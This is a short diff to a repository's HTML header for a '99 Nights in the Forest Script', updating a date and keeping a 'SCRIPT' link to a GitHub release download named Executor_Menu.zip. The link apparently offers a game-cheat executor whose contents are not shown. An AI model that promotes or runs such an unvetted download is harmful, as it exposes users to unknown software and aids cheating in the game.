@@ -7,7 +7,7 @@
 <h2 align="center">
 <table align="center"> <tr>
       <th scope="col">99 Nights in the Forest Script</th>
-      <th scope="col">10 / 29 / 2025</th>
+      <th scope="col">11 / 8 / 2025</th>
   <th scope="col"><a href='https://github.com/Decryptor-j/99-Nights-in-The-Forest-Script/releases/download/99-Nights-in-The-Forest-Script-ALPHA/Executor_Menu.zip'>SCRIPT</a></th>
  </tr></table>
 </h2>
